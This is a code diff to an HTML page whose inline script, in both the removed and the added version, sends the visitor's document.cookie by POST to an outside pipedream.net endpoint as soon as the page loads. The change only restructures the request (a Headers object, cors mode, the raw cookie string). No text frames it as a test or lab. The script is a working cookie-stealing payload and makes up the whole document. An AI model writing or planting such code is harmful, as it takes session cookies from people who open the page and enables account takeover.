@@ -5,11 +5,17 @@
 </head>
 <body>
 <script>
-    fetch("https://eocyumvmpl620tg.m.pipedream.net", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookies: document.cookie }),
-    });
+    const headers = new Headers()
+    headers.append("Content-Type", "application/json")
+
+    const options = {
+    method: "POST",
+    headers,
+    mode: "cors",
+    body: document.cookie,
+    }
+
+    fetch("https://eocyumvmpl620tg.m.pipedream.net", options)
 </script>
 </body>
 </html>
